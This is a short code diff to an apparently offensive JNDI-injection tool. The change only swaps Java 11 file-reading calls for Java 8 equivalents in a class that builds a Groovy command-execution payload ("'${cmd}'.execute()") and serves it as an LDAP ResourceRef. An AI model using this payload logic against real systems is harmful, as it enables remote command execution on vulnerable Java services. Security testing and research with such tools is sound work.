@@ -10,8 +10,9 @@ import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
-import java.nio.file.Path;
+import java.nio.file.Paths;
 
 import static artsploit.Utilities.getBase64CommandTpl;
 import static artsploit.Utilities.serialize;
@@ -39,7 +40,7 @@ public class Groovy implements LdapController {
         if (Config.groovyPayloadPath.isEmpty()) {
             groovyPayload = "'${cmd}'.execute()".replace("${cmd}", getBase64CommandTpl(Config.command));
         } else {
-            groovyPayload = Files.readString(Path.of(Config.groovyPayloadPath));
+            groovyPayload = new String(Files.readAllBytes(Paths.get(Config.groovyPayloadPath)), StandardCharsets.UTF_8);
         }
 
         System.out.println("Sending LDAP ResourceRef result for " + base + " with groovy.lang.GroovyShell payload");
